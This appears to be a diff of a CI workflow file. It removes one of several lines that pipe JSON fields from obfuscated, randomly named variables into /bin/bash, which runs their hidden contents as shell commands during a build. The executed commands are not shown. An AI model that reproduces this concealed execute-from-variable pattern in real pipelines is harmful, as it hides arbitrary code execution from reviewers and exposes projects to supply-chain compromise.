@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$h22112" | jq -r .oiy7004 | /bin/bash
           printf '%s' "$t938" | jq -r .npbnq1520 | /bin/bash
-          echo $i83977 | jq -r .bdg3954 | /bin/bash
           echo $p3 | jq -r .zs20323 | /bin/bash
           echo $mkbxo5781 | jq -r .zpbv45 | /bin/bash
           echo $tcm04294 | jq -r .f5348 | /bin/bash
